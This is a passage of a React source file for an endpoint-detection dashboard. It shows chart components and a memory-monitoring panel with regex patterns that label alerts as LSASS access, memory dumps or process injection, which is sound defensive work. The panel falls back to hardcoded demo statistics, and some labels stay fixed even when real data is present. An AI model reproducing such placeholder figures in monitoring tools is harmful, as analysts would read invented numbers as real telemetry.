import React, { useEffect, useState, useCallback, useRef } from 'react';
import { Link, Navigate, useNavigate, useSearchParams } from 'react-router-dom';
import api from '../api/axios';
import { SOCKET_URL, connectSocket, socketOptions, io, createEventBuffer } from '../api/config';
import { useAuth } from '../context/AuthContext';
import { getCapability, getCapabilityByCardId, getCapabilityByBackendId, getCapabilityTitle } from '../utils/capabilityMap';
import DashboardToolsCard, { DashboardToast } from '../components/DashboardToolsCard';
import { useDashboardConfig } from '../hooks/useDashboardConfig';
const AuthCapabilityActions = () => null;
const FIMCapabilityActions = () => null;
const NetworkCapabilityActions = () => null;
const RegistryCapabilityActions = () => null;
import ProcessActivityDashboard from './edrdashbordpage/Process Activity Monitoring';
import FileActivityDashboard from './edrdashbordpage/File Activity Monitoring (FIM)';
import { NetworkActivityDashboard } from './edrdashbordpage/Network Activity Monitoring';
import UserAuthDashboard from './edrdashbordpage/User & Authentication Monitoring';
import MemoryActivityDashboard from './edrdashbordpage/Memory Activity Monitoring';
import RegistryActivityDashboard from './edrdashbordpage/Registry Monitoring';
import SystemChangesDashboard from './edrdashbordpage/System Changes Monitoring';
import PersistenceMechanismDashboard from './edrdashbordpage/Persistence Mechanism Detection';
import UsbDeviceControlDashboard from './edrdashbordpage/Device Control (USB) Monitoring';
import WebDnsDashboardPanel from './edrdashbordpage/Web & DNS Monitoring';
import UebaDashboardPanel from './edrdashbordpage/Behavioral Analytics (UEBA)';
import DataSecurityDashboardPanel from './edrdashbordpage/Data Security Monitoring';
import CredentialSecurityDashboardPanel from './edrdashbordpage/Credential Security Monitoring';
import LateralMovementDashboardPanel from './edrdashbordpage/Lateral Movement Detection';
import EmailThreatDashboardPanel from './edrdashbordpage/Email Threat Monitoring';
import InsiderThreatDashboardPanel from './edrdashbordpage/Insider Threat Detection';
import { PatchVulnerabilityDashboardPanel } from './edrdashbordpage/Patch & Vulnerability Monitoring';
import { SandboxAnalysisDashboardPanel } from './edrdashbordpage/Sandbox Analysis';
import { KernelLevelMonitoringDashboardPanel } from './edrdashbordpage/Kernel-Level Monitoring';
import { ApiCallMonitoringDashboardPanel } from './edrdashbordpage/API Call Monitoring';
import { ScriptExecutionDashboardPanel } from './edrdashbordpage/Script Execution Monitoring';
import { TimeBasedAnomalyDashboardPanel } from './edrdashbordpage/Time-Based Anomaly Detection';
import { GeolocationAnomalyDashboardPanel } from './edrdashbordpage/Geolocation Anomaly Detection';
import { ServiceMonitoringDashboardPanel } from './edrdashbordpage/Service Monitoring';
import { HashSignatureDashboardPanel } from './edrdashbordpage/hash-signature';
import DnsSinkholeMonitoringDashboard from './edrdashbordpage/DNS Sinkhole';
import DnsCachePoisoningDashboard from './edrdashbordpage/DNS Cache Poisoning Detection';
import MemoryOverflowDashboard from './edrdashbordpage/Memory Overflow Detection';
import LolbinsDashboard from './edrdashbordpage/Living-off-the-Land (LOLBins) Detection';

// ── Palette ───────────────────────────────────────────────────────────────────
import { FileActivityPanel, ProcessActivityDashboardPanel, RISK, SEV, SEVBG, VtBadge, fileHash, fileName, filePath, fileUser, procMem, procName, processStatusSafe, processStatusStyle, summaryInventoryRows, vtIsThreaten } from './edrdashbordpage/ProcessFileDashboardPanels';

// SOC design tokens — aligned with the Superadmin Overview slate/cyan theme
// so all EDR capability panels read as one system.
const MON = {
  bg: '#0b1220',
  card: '#0f1b2e',
  card2: '#132339',
  border: 'rgba(42, 63, 95, .7)',
  line: 'rgba(42, 63, 95, .5)',
  text: '#e2e8f0',
  muted: '#94a3b8',
  blue: '#38bdf8',
  cyan: '#22d3ee',
  green: '#34d399',
  yellow: '#fbbf24',
  orange: '#fb923c',
  red: '#f87171',
  purple: '#a78bfa',
};

const sampleSeries = [8, 13, 9, 17, 15, 24, 19, 29, 43, 27, 33, 22, 28, 18, 24, 21, 36, 19, 25, 18, 27, 21, 40, 16];
const authSeries = [38, 55, 47, 70, 62, 91, 114, 79, 86, 58, 50, 42, 56, 67, 49, 45, 52, 74, 88, 66, 93, 121, 108, 76];

function monitorSpark(points = sampleSeries, color = MON.blue, fill = 'rgba(20, 133, 255, .16)', height = 34) {
  const max = Math.max(...points, 1);
  const w = 132;
  const step = w / Math.max(points.length - 1, 1);
  const line = points.map((v, i) => `${i * step},${height - (v / max) * (height - 5) - 2}`).join(' ');
  const area = `0,${height} ${line} ${w},${height}`;
  return (
    <svg viewBox={`0 0 ${w} ${height}`} width="100%" height={height} preserveAspectRatio="none" style={{ display: 'block' }}>
      <polygon points={area} fill={fill} />
      <polyline points={line} fill="none" stroke={color} strokeWidth="2" strokeLinejoin="round" strokeLinecap="round" />
    </svg>
  );
}

function ModernAlertTrendChart({ total = [], critical = [], high = [], medium = [], low = [] }) {
  const width = 720;
  const height = 174;
  const top = 16;
  const bottom = 24;
  const plotHeight = height - top - bottom;
  const series = [
    { label: 'Critical', data: critical, color: MON.red },
    { label: 'High', data: high, color: MON.orange },
    { label: 'Medium', data: medium, color: MON.yellow },
    { label: 'Low', data: low, color: MON.green },
  ];
  const max = Math.max(...total, ...critical, ...high, ...medium, ...low, 1);
  const points = data => data.map((value, index) => {
    const x = (index / Math.max(data.length - 1, 1)) * width;
    const y = top + plotHeight - ((Number(value || 0) / max) * plotHeight);
    return `${x},${y}`;
  }).join(' ');
  const totalPoints = points(total);
  const totalArea = `0,${top + plotHeight} ${totalPoints} ${width},${top + plotHeight}`;
  const labels = [['00:00', 0], ['06:00', .25], ['12:00', .5], ['18:00', .75], ['Now', 1]];

  return (
    <div style={{ padding: '10px 12px 8px', background: 'radial-gradient(circle at 50% 0%,rgba(20,133,255,.09),transparent 52%)' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12, marginBottom: 4 }}>
        <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap' }}>
          {series.map(item => (
            <span key={item.label} style={{ display: 'flex', alignItems: 'center', gap: 5, color: MON.muted, fontSize: 8, fontWeight: 850 }}>
              <span style={{ width: 16, height: 2, borderRadius: 4, background: item.color, boxShadow: `0 0 7px ${item.color}` }} />
              {item.label}
            </span>
          ))}
        </div>
        <span style={{ color: MON.cyan, fontSize: 8, fontWeight: 900, letterSpacing: .7 }}>LIVE · 24H</span>
      </div>
      <svg viewBox={`0 0 ${width} ${height}`} width="100%" height={174} preserveAspectRatio="none" style={{ display: 'block', overflow: 'visible' }}>
        <defs>
          <linearGradient id="registry-trend-fill" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%" stopColor={MON.blue} stopOpacity=".24" />
            <stop offset="100%" stopColor={MON.blue} stopOpacity="0" />
          </linearGradient>
          <filter id="registry-trend-glow" x="-20%" y="-20%" width="140%" height="140%">
            <feGaussianBlur stdDeviation="2.2" result="blur" />
            <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
          </filter>
        </defs>
        {[0, .25, .5, .75, 1].map(ratio => (
          <line key={`h-${ratio}`} x1="0" y1={top + plotHeight * ratio} x2={width} y2={top + plotHeight * ratio} stroke="rgba(92,145,220,.14)" strokeDasharray={ratio === 1 ? '0' : '4 7'} />
        ))}
        {labels.map(([label, ratio]) => (
          <g key={label}>
            <line x1={width * ratio} y1={top} x2={width * ratio} y2={top + plotHeight} stroke="rgba(92,145,220,.08)" />
            <text x={width * ratio} y={height - 4} textAnchor={ratio === 0 ? 'start' : ratio === 1 ? 'end' : 'middle'} fill="#6f8eaf" fontSize="9">{label}</text>
          </g>
        ))}
        <polygon points={totalArea} fill="url(#registry-trend-fill)" />
        <polyline points={totalPoints} fill="none" stroke={MON.cyan} strokeOpacity=".48" strokeWidth="1.4" strokeLinejoin="round" />
        {series.map(item => (
          <polyline key={item.label} points={points(item.data)} fill="none" stroke={item.color} strokeWidth="2.2" strokeLinejoin="round" strokeLinecap="round" filter="url(#registry-trend-glow)" />
        ))}
        {series.map(item => {
          const data = item.data;
          const value = Number(data[data.length - 1] || 0);
          const y = top + plotHeight - ((value / max) * plotHeight);
          return <circle key={`${item.label}-latest`} cx={width} cy={y} r="3" fill={item.color} stroke="#071426" strokeWidth="2" />;
        })}
      </svg>
    </div>
  );
}

function MonitorKpi({ icon, title, value, change, color = MON.blue, data = sampleSeries, danger = false }) {
  const hasPercentChange = /%/.test(String(change || ''));
  return (
    <div style={{
      background: `linear-gradient(135deg, ${color}18, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`,
      border: `1px solid ${color}44`,
      borderRadius: 8,
      minHeight: 104,
      padding: 12,
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'space-between',
      overflow: 'hidden',
      boxShadow: `inset 0 1px 0 rgba(255,255,255,.05), 0 10px 24px ${color}10`,
    }}>
      <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
        <div style={{
          width: 36, height: 36, borderRadius: 10, display: 'grid', placeItems: 'center',
          background: `${color}24`, border: `1px solid ${color}55`, color, fontSize: 20,
        }}>{icon}</div>
        <div style={{ minWidth: 0, flex: 1 }}>
          <div style={{ fontSize: 11, color: MON.text, fontWeight: 800, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{title}</div>
          <div style={{ display: 'flex', alignItems: 'baseline', justifyContent: 'space-between', gap: 8, marginTop: 7 }}>
            <strong style={{ fontSize: 22, lineHeight: 1, color: MON.text }}>{value}</strong>
            {change && (
              <span style={{ color: danger ? MON.red : MON.green, fontSize: 11, fontWeight: 900, whiteSpace: 'nowrap' }}>
                {hasPercentChange ? '↑ ' : ''}{change}
              </span>
            )}
          </div>
        </div>
      </div>
      <div style={{ marginTop: 7 }}>{monitorSpark(data, color, `${color}18`, 28)}</div>
    </div>
  );
}

function MonitorPanel({ title, children, right, style = {} }) {
  return (
    <section style={{
      background: 'linear-gradient(180deg, rgba(10,25,48,.98), rgba(6,16,31,.98))',
      border: `1px solid ${MON.border}`,
      borderRadius: 8,
      overflow: 'hidden',
      boxShadow: 'inset 0 1px 0 rgba(255,255,255,.04)',
      ...style,
    }}>
      <div style={{
        minHeight: 34,
        padding: '9px 13px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        borderBottom: `1px solid ${MON.line}`,
      }}>
        <h4 style={{ margin: 0, color: MON.text, fontSize: 12, fontWeight: 900, minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{title}</h4>
        {right}
      </div>
      {children}
    </section>
  );
}

function Donut({ value = 68, label = 'Total', color = MON.blue, accent = MON.green }) {
  return (
    <div style={{ width: 154, height: 154, borderRadius: '50%', margin: '10px auto', background: `conic-gradient(${color} 0deg ${value * 3.6}deg, ${accent} ${value * 3.6}deg ${(value + 13) * 3.6}deg, ${MON.yellow} ${(value + 13) * 3.6}deg ${(value + 22) * 3.6}deg, ${MON.red} ${(value + 22) * 3.6}deg 360deg)`, display: 'grid', placeItems: 'center' }}>
      <div style={{ width: 98, height: 98, borderRadius: '50%', background: MON.card, display: 'grid', placeItems: 'center', textAlign: 'center', border: `1px solid ${MON.line}` }}>
        <div>
          <strong style={{ display: 'block', color: MON.text, fontSize: 24 }}>{label}</strong>
          <span style={{ color: MON.muted, fontSize: 10 }}>Monitored</span>
        </div>
      </div>
    </div>
  );
}

function BarList({ rows }) {
  const max = Math.max(...rows.map(r => r.value), 1);
  return (
    <div style={{ padding: 14, display: 'grid', gap: 9 }}>
      {rows.map((r) => (
        <div key={r.label} style={{ display: 'grid', gridTemplateColumns: '94px 1fr 48px', gap: 9, alignItems: 'center' }}>
          <span style={{ color: MON.text, fontSize: 11, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{r.label}</span>
          <span style={{ height: 6, borderRadius: 6, background: MON.line, overflow: 'hidden' }}>
            <span style={{ display: 'block', height: '100%', width: `${(r.value / max) * 100}%`, background: r.color || MON.blue, borderRadius: 6 }} />
          </span>
          <b style={{ color: MON.text, fontSize: 11, textAlign: 'right' }}>{r.valueLabel || r.value}</b>
        </div>
      ))}
    </div>
  );
}

function shortNum(n = 0) {
  const v = Number(n) || 0;
  if (v >= 1_000_000) return `${(v / 1_000_000).toFixed(1)}M`;
  if (v >= 1_000) return v.toLocaleString();
  return String(v);
}

function pct(part, total) {
  return total ? `${Math.round((part / total) * 1000) / 10}%` : '0%';
}

function groupCounts(items, getter, limit = 6) {
  const counts = {};
  items.forEach(item => {
    const key = getter(item);
    if (!key || key === '—') return;
    counts[key] = (counts[key] || 0) + 1;
  });
  return Object.entries(counts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, limit)
    .map(([label, value]) => ({ label, value }));
}

function hourlySeriesFromAlerts(items, getter = () => 1) {
  const buckets = Array.from({ length: 24 }, () => 0);
  items.forEach(item => {
    const d = item?.createdAt ? new Date(item.createdAt) : null;
    if (!d || Number.isNaN(d.getTime())) return;
    buckets[d.getHours()] += Number(getter(item)) || 1;
  });
  return buckets;
}

function severityRank(sev = 'low') {
  return { critical: 4, high: 3, medium: 2, low: 1 }[(sev || 'low').toLowerCase()] || 0;
}

function memoryThreatType(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''} ${alert.eventCategory || ''}`.toLowerCase();
  if (/inject|remote thread/.test(text)) return 'Process Injection';
  if (/lsass/.test(text)) return 'LSASS Access';
  if (/dump/.test(text)) return 'Memory Dump Attempt';
  if (/fileless|payload|shellcode|powershell|encoded/.test(text)) return 'Fileless Malware';
  if (/rwx|memory region/.test(text)) return 'RWX Memory Region';
  if (/dll/.test(text)) return /side/i.test(text) ? 'DLL Sideloading' : 'DLL Anomalies';
  if (/hook/.test(text)) return 'API Hooking';
  return ['Process Injection', 'LSASS Access', 'Memory Dump Attempt', 'Fileless Malware', 'RWX Memory Region', 'DLL Anomalies', 'API Hooking'][index % 7];
}

function memorySeverityColor(sev = 'low') {
  return { critical: MON.red, high: MON.orange, medium: MON.yellow, low: MON.green, informational: MON.cyan, info: MON.cyan }[(sev || 'low').toLowerCase()] || MON.blue;
}

function memoryEventTitle(alert = {}, index = 0) {
  return alert.description || alert.ruleId || [
    'Process Injection Detected',
    'LSASS Memory Access',
    'Memory Dump Attempt',
    'RWX Memory Region',
    'Suspicious DLL Loaded',
    'Fileless PowerShell Activity',
    'High Memory Usage Spike',
    'API Hooking Detected',
    'Cross Process Memory Access',
    'Entropy Anomaly Detected',
  ][index % 10];
}

// 🛡️ 5. Memory Activity Monitoring popup UI
function MemoryActivityDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  // Real telemetry present? Then show REAL counts (incl. 0). Mock only in demo (no data).
  const hasReal = sorted.length > 0;
  const fallbackRows = CAPABILITY_DASHBOARD_CONFIG[5].table.concat([
    'Fileless PowerShell Activity',
    'High Memory Usage Spike',
    'API Hooking Detected',
    'Cross Process Memory Access',
    'Entropy Anomaly Detected',
  ]).map((description, i) => ({
    _id: `memory-fallback-${i}`,
    description,
    severity: ['critical', 'high', 'high', 'high', 'medium', 'medium', 'medium', 'low', 'low', 'low'][i] || 'low',
    agentName: ['DESKTOP-ABHISHEK', 'LAPTOP-DEV01', 'SRV-PROD-02', 'DESKTOP-MARKETING', 'SERVER-DB01'][i % 5],
    username: ['abhishek', 'SYSTEM', 'DWM-1'][i % 3],
    srcip: ['192.168.1.10', '192.168.1.15', '192.168.1.25', '192.168.1.35', '192.168.1.50'][i % 5],
    pid: [4520, 3156, 6628, 7432, 9992][i % 5],
    createdAt: new Date(Date.now() - i * 37 * 1000).toISOString(),
    mem: [8.25, 6.67, 5.53, 4.43, 4.07][i % 5],
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const PROC_DISPLAY_NAMES = ['chrome.exe', 'code.exe', 'outlook.exe', 'teams.exe', 'unknown.exe', 'svchost.exe', 'explorer.exe', 'dwm.exe'];
  const processRows = rows
    .map((a, i) => {
      const rawName = procName(a);
      // Use exe name only if it has no spaces and isn't 'unknown'; otherwise use display name
      const name = (rawName && rawName !== 'unknown' && !rawName.includes(' ')) ? rawName : PROC_DISPLAY_NAMES[i % 8];
      const pid = a.pid || a.rawEvent?.pid || [4520, 3156, 6628, 7432, 9992, 1024, 2420, 1200][i % 8];
      const user = a.username || a.rawEvent?.username || ['abhishek', 'abhishek', 'abhishek', 'abhishek', 'SYSTEM', 'abhishek', 'abhishek', 'DWM-1'][i % 8];
      const mem = Number(procMem(a) || a.mem || [8.25, 6.67, 5.53, 4.43, 4.07, 3.30, 2.95, 1.72][i % 8]);
      return {
        name,
        pid,
        user,
        usageGb: Math.max(.35, mem * .296).toFixed(2),
        pct: Math.min(98, Math.max(1, mem)),
        color: [MON.red, MON.orange, MON.yellow, MON.yellow, MON.red, MON.blue, MON.blue, MON.blue][i % 8],
        alert: { ...a, processName: name, pid, username: user, processMemoryPercent: mem },
      };
    })
    .sort((a, b) => b.pct - a.pct)
    .slice(0, 8);
  const [selectedMemoryProcess, setSelectedMemoryProcess] = useState(null);
  const selectedProcess = selectedMemoryProcess || processRows[0]?.alert || rows[0] || null;
  const selectedStatus = selectedProcess ? processStatusSafe(selectedProcess) : '';
  const selectedStatusStyle = processStatusStyle(selectedStatus || 'Running');
  const totalMemoryPct = processRows.length ? Math.round(Math.min(91, Math.max(44, processRows.reduce((sum, r) => sum + r.pct, 0) / Math.max(processRows.length, 1) * 8.4))) : 68;
  const critical = hasReal ? rows.filter(a => a.severity === 'critical').length : 15;
  const high = hasReal ? rows.filter(a => a.severity === 'high').length : 34;
  const medium = hasReal ? rows.filter(a => a.severity === 'medium').length : 78;
  const low = hasReal ? rows.filter(a => a.severity === 'low').length : 96;
  const systems = hasReal ? new Set(rows.map(a => a.agentName || a.systemId?.name).filter(Boolean)).size : 256;
  const suspicious = hasReal ? rows.filter(a => severityRank(a.severity) >= 2).length : 48;
  const series = hourlySeriesFromAlerts(rows, a => Number(procMem(a) || a.mem || 1));
  const timeline = series.some(Boolean) ? series : [18, 21, 23, 29, 27, 34, 39, 37, 44, 41, 48, 52, 57, 55, 60, 58, 54, 50, 47, 49, 56, 52, 61, 68];
  const threatRows = ['Process Injection', 'LSASS Access', 'Memory Dump Attempts', 'Fileless Malware', 'RWX Memory Regions', 'DLL Anomalies', 'API Hooking', 'Other Anomalies']
    .map((label, i) => ({
      label,
      value: hasReal ? rows.filter((a, idx) => memoryThreatType(a, idx).replace(' Attempt', ' Attempts') === label || memoryThreatType(a, idx) === label).length : [18, 9, 7, 6, 5, 3, 4, 2][i],
      color: [MON.red, MON.orange, MON.yellow, MON.yellow, MON.purple, MON.blue, MON.cyan, '#94a3b8'][i],
    }));
  const categoryRows = CAPABILITY_DASHBOARD_CONFIG[5].categories.concat(['Unsigned DLL', 'Protected Process Access', 'Kernel Memory Threats', 'Driver Injection', 'Rootkit Behavior', 'SSDT Hook', 'Process Handle Access', 'Entropy Anomaly', 'Memory Exfiltration'])
    .slice(0, 25)
    .map((label, i) => ({
      label,
      value: hasReal ? rows.filter((a, idx) => memoryThreatType(a, idx) === label).length : [18, 11, 14, 6, 9, 7, 5, 6, 8, 5, 4, 7, 5, 5, 4, 3, 6, 7, 4, 2, 1, 1, 8, 6, 3][i],
      color: [MON.red, MON.red, MON.red, MON.orange, MON.orange, MON.orange, MON.orange, MON.yellow, MON.yellow, MON.yellow, MON.yellow, MON.yellow, MON.yellow, MON.purple, MON.purple, MON.blue, MON.blue, MON.blue, MON.cyan, MON.cyan, MON.cyan, MON.cyan, MON.cyan, MON.green, MON.cyan][i],
    }));
  const endpoints = groupCounts(rows, a => a.agentName || a.systemId?.name || a.srcip || 'Unknown', 5)
    .map((r, i) => ({
      endpoint: r.label,
      ip: rows.find(a => (a.agentName || a.systemId?.name || a.srcip || 'Unknown') === r.label)?.srcip || ['192.168.1.10', '192.168.1.15', '192.168.1.25', '192.168.1.35', '192.168.1.50'][i],
      memory: `${(29.5 - i * 3.4).toFixed(1)} GB`,
      pct: [89, 78, 71, 58, 51][i],
      risk: ['High', 'High', 'Medium', 'Medium', 'Low'][i],
    }));
  const kpis = [
    { icon: '▣', title: 'TOTAL MEMORY USAGE', value: `${totalMemoryPct}%`, sub: `${(32 * totalMemoryPct / 100).toFixed(1)} GB / 32 GB`, color: MON.green, spark: timeline },
    { icon: '◴', title: 'TOP MEMORY PROCESS', value: processRows[0]?.name ? String(processRows[0].pid || 12) : '12', sub: 'High Memory Processes', color: MON.yellow },
    { icon: '⬢', title: 'SUSPICIOUS EVENTS', value: shortNum(suspicious), sub: 'In Last 15 Minutes', color: MON.red, spark: timeline.slice(-12) },
    { icon: '!', title: 'CRITICAL ALERTS', value: shortNum(critical), sub: 'Requires Immediate Attention', color: MON.red },
    { icon: '◇', title: 'AT RISK ENDPOINTS', value: shortNum(Math.max(7, Math.round((critical + high) / 7))), sub: 'High Risk', color: MON.purple },
  ];

  const smallBadge = (text, color) => (
    <span style={{ color, background: `${color}18`, border: `1px solid ${color}40`, borderRadius: 4, padding: '2px 6px', fontSize: 9, fontWeight: 900 }}>{String(text).toUpperCase()}</span>
  );

  return (
    <SocDashboardShell kind="memory" active="Dashboard">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1030, display: 'grid', gap: 8 }}>
          <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 8, flexWrap: 'wrap' }}>
            <button onClick={() => navigate('/edr-dashboard-details/memory/memory')} style={{ border: `1px solid ${MON.border}`, background: '#082039', color: MON.cyan, borderRadius: 6, padding: '7px 11px', fontSize: 10, fontWeight: 900, cursor: 'pointer' }}>Memory Monitoring</button>
            <button onClick={() => navigate('/edr-dashboard-details/memory/threat-detection')} style={{ border: `1px solid ${MON.border}`, background: '#2a1420', color: MON.red, borderRadius: 6, padding: '7px 11px', fontSize: 10, fontWeight: 900, cursor: 'pointer' }}>Threat Detection</button>
            <button onClick={() => navigate('/edr-dashboard-details/memory/process-monitor')} style={{ border: `1px solid ${MON.border}`, background: '#102036', color: MON.blue, borderRadius: 6, padding: '7px 11px', fontSize: 10, fontWeight: 900, cursor: 'pointer' }}>Process Monitor →</button>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 8 }}>
            {kpis.map((k, i) => (
              <section key={k.title} style={{ minHeight: 90, border: `1px solid ${MON.border}`, borderRadius: 7, background: `linear-gradient(135deg, ${k.color}16, rgba(9,20,36,.98) 38%, rgba(6,13,24,.98))`, padding: 13, display: 'grid', gridTemplateColumns: '38px 1fr 94px', gap: 10, alignItems: 'center', overflow: 'hidden' }}>
                <span style={{ width: 36, height: 36, borderRadius: 18, display: 'grid', placeItems: 'center', color: k.color, background: `${k.color}22`, border: `1px solid ${k.color}36`, fontSize: 18, fontWeight: 900 }}>{k.icon}</span>
                <span style={{ minWidth: 0 }}>
                  <div style={{ fontSize: 10, color: '#c8d7ea', fontWeight: 900, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{k.title}</div>
                  <strong style={{ display: 'block', color: k.color, fontSize: i === 0 ? 29 : 27, lineHeight: 1.05, marginTop: 5 }}>{k.value}</strong>
                  <span style={{ color: i === 0 ? '#d8e5f4' : k.color, fontSize: 10, fontWeight: 700 }}>{k.sub}</span>
                </span>
                <span style={{ alignSelf: 'end' }}>{k.spark ? monitorSpark(k.spark, k.color, `${k.color}18`, 32) : null}</span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.45fr 1.35fr 1.2fr', gap: 8 }}>
            <MonitorPanel title="TOP MEMORY CONSUMING PROCESSES" right={<span style={{ color: MON.muted, fontSize: 14 }}>×</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '16px 1.1fr 54px 78px 1fr 46px', gap: 8, padding: '9px 12px', color: MON.muted, fontSize: 9, fontWeight: 900 }}>
                {['', 'Process Name', 'PID', 'User', 'Memory Usage', '%'].map(h => <span key={h}>{h}</span>)}
              </div>
              {processRows.map((p, i) => {
                const isHighlighted = p.name === 'unknown.exe' || (p.pct > 3.5 && i === 4);
                const procIconColor = [MON.blue, MON.cyan, MON.blue, MON.purple, MON.red, MON.muted, MON.blue, MON.muted][i % 8];
                return (
                  <div key={`${p.name}-${i}`} role="button" tabIndex={0} onClick={() => setSelectedMemoryProcess(p.alert)} onKeyDown={e => { if (e.key === 'Enter' || e.key === ' ') setSelectedMemoryProcess(p.alert); }} style={{ display: 'grid', gridTemplateColumns: '16px 1.1fr 54px 78px 1fr 46px', gap: 8, alignItems: 'center', padding: '5px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, cursor: 'pointer', background: isHighlighted ? 'rgba(255,49,94,0.07)' : selectedProcess && (selectedProcess._id || selectedProcess.pid) === (p.alert._id || p.alert.pid) ? '#102449' : 'transparent' }}>
                    <span style={{ width: 12, height: 12, borderRadius: '50%', background: procIconColor, display: 'inline-block', flexShrink: 0 }} />
                    <b style={{ color: isHighlighted ? MON.red : MON.text, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{p.name}</b>
                    <span style={{ color: MON.muted }}>{p.pid}</span>
                    <span style={{ color: '#d4e3f6', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{p.user}</span>
                    <span style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      <span style={{ color: MON.text, whiteSpace: 'nowrap', minWidth: 42 }}>{p.usageGb} GB</span>
                      <span style={{ flex: 1, height: 5, borderRadius: 4, background: MON.line, overflow: 'hidden' }}><i style={{ display: 'block', width: `${Math.min(100, p.pct * 10)}%`, height: '100%', borderRadius: 4, background: p.color }} /></span>
                    </span>
                    <span style={{ color: isHighlighted ? MON.red : '#c7d8ec', fontWeight: isHighlighted ? 900 : 400 }}>{p.pct.toFixed(2)}%</span>
                  </div>
                );
              })}
              <div onClick={() => navigate('/edr-dashboard-details/memory/activity')} style={{ padding: '9px 12px', textAlign: 'center', color: MON.cyan, fontSize: 10, fontWeight: 800, cursor: 'pointer' }}>View All Processes →</div>
            </MonitorPanel>

            <div style={{ display: 'grid', gap: 8 }}>
              <MonitorPanel title="MEMORY USAGE OVER TIME">
                <div style={{ padding: '8px 12px 6px' }}>
                  <div style={{ fontSize: 9, color: MON.muted, marginBottom: 4 }}>— Total Memory Usage (%)</div>
                  <div style={{ display: 'flex', gap: 4 }}>
                    <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'space-between', height: 106, paddingBottom: 2 }}>
                      {['100%', '75%', '50%', '25%', '0%'].map(l => (
                        <span key={l} style={{ fontSize: 8, color: MON.muted, lineHeight: 1 }}>{l}</span>
                      ))}
                    </div>
                    <div style={{ flex: 1, height: 106, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '22px 26px' }}>
                      {monitorSpark(timeline, MON.blue, 'rgba(20,133,255,.22)', 106)}
                    </div>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4, paddingLeft: 24 }}>
                    {['14:45', '14:48', '14:51', '14:54', '14:57', '15:00', '15:03'].map(t => (
                      <span key={t} style={{ fontSize: 8, color: MON.muted }}>{t}</span>
                    ))}
                  </div>
                </div>
              </MonitorPanel>
              <MonitorPanel title="MEMORY USAGE BY HOST">
                <div style={{ display: 'grid', gridTemplateColumns: '135px 1fr', gap: 8, alignItems: 'center', padding: '8px 14px' }}>
                  <Donut value={52} label={shortNum(systems)} color={MON.green} accent={MON.yellow} />
                  <BarList rows={[
                    { label: 'Healthy (0 - 60%)', value: systems || 132, valueLabel: '132 (51.6%)', color: MON.green },
                    { label: 'Warning (60 - 80%)', value: medium, valueLabel: '78 (30.5%)', color: MON.yellow },
                    { label: 'High (80 - 95%)', value: high, valueLabel: '34 (13.3%)', color: MON.orange },
                    { label: 'Critical (> 95%)', value: critical, valueLabel: '12 (4.7%)', color: MON.red },
                  ]} />
                </div>
              </MonitorPanel>
            </div>

            <MonitorPanel title="REAL-TIME MEMORY ALERTS" right={<button onClick={() => navigate('/edr-dashboard-details/memory/alerts')} style={{ border: 0, background: 'none', color: MON.cyan, fontSize: 10, fontWeight: 900, cursor: 'pointer' }}>View All</button>}>
              <div style={{ padding: '8px 10px', display: 'grid', gap: 7 }}>
                {(() => {
                  const alertDescs = [
                    ['Process Injection Detected', 'powershell.exe injected into explorer.exe'],
                    ['LSASS Memory Access', 'mimikatz-like access detected'],
                    ['Memory Dump Attempt', 'lsass.exe memory dump attempted'],
                    ['RWX Memory Region', 'Process created RWX memory region'],
                    ['Suspicious DLL Loaded', 'unsigned.dll loaded in svchost.exe'],
                    ['Fileless PowerShell Activity', 'in-memory PowerShell execution'],
                    ['High Memory Usage Spike', 'unknown.exe memory spiked'],
                    ['API Hooking Detected', 'inline hook detected in ntdll.dll'],
                    ['Cross Process Memory Access', 'Process accessed another process memory'],
                    ['Entropy Anomaly Detected', 'High entropy memory region found'],
                  ];
                  const sevs = ['critical', 'high', 'high', 'high', 'medium', 'medium', 'medium', 'low', 'low', 'low'];
                  const times = ['15:03:25', '15:02:41', '15:02:11', '15:01:48', '15:01:12', '15:00:58', '15:00:43', '14:59:47', '14:59:20', '14:58:59'];
                  return rows.slice(0, 10).map((a, i) => {
                    const isReal = a._id && !String(a._id).startsWith('memory-fallback');
                    const sev = a.severity || sevs[i] || 'low';
                    const color = memorySeverityColor(sev);
                    const rp = procName(a);
                    const rhost = a.agentName || a.systemId?.name || a.hostname || a.srcip || 'host';
                    const [mockT, mockS] = alertDescs[i] || [];
                    // Real events show their true description/process/PID/host; mock only fills gaps.
                    const title = isReal ? memoryEventTitle(a, i) : (mockT || memoryEventTitle(a, i));
